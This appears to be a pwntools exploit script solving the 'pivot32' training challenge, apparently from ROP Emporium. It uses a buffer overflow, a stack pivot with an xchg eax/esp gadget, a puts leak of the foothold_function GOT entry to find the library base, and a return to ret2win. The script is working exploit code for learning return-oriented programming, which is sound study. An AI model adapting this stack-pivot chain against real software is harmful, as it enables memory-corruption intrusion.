from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./pivot32', 'b *0x0804889f')
p = process('./pivot32')

padding = b'A'*44
ebx_value_ret2win = -0x168d+0x15e7+0xa19
pop_eax = p32(0x080488c0)
xchg_eax_esp = p32(0x080488c2)
foothold_offset = 0x00000770
ret2win_offset = 0x00000967

foothold_plt = p32(0x080485f0)
foothold_got = p32(0x0804a024)
puts_plt = p32(0x080485d0)
main = p32(0x0804873b)

p.recvuntil("to pivot: ")
pivot = p32(int(p.recv(10),16))

first_chain = padding
first_chain += pop_eax
first_chain += pivot
first_chain += xchg_eax_esp

second_chain = foothold_plt
second_chain += puts_plt
second_chain += main
second_chain += foothold_got

p.sendline(second_chain)
p.sendline(first_chain)
p.recvuntil('libpivot.so')
foothold_addr = u32(p.recv(4))
libpivot_base = foothold_addr - foothold_offset
ret2win_addr = p32(libpivot_base + ret2win_offset)

third_chain = padding
third_chain += ret2win_addr

p.sendline()
p.sendline(third_chain)

p.recvuntil("smash")
print(p.recvall().decode())
